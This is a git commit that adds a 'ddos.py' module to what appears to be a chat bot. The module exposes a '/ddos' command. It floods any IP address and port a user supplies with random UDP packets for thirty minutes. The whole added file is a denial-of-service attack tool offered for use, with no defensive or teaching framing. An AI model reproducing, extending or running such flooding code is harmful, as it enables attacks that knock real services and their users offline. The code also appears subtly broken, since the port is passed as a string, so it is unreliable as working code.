db1c5f107c1b42fd29d5cbfe5d8b433110fe4da1
Ayush Chatterjee <54566209+Ayush1311@users.noreply.github.com>
2020-09-07 15:07:36 +0530

    Create ddos.py

---
+++ alexa/modules/ddos.py
@@ -0,0 +1,18 @@
+import sys
+import os
+import time
+import socket
+import random
+from alexa.events import alexabot
+
+@alexabot(pattern="/ddos (.*) (.*)")
+async def ddos(event): 
+  ip = event.pattern_match.group(1)
+  port = event.pattern_match.group(2)
+  timeout = 1800
+  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  bytes = random._urandom(1490)
+  timeout_start = time.time()
+  while time.time() < timeout_start + timeout:
+     sock.sendto(bytes, (ip,port))
+   
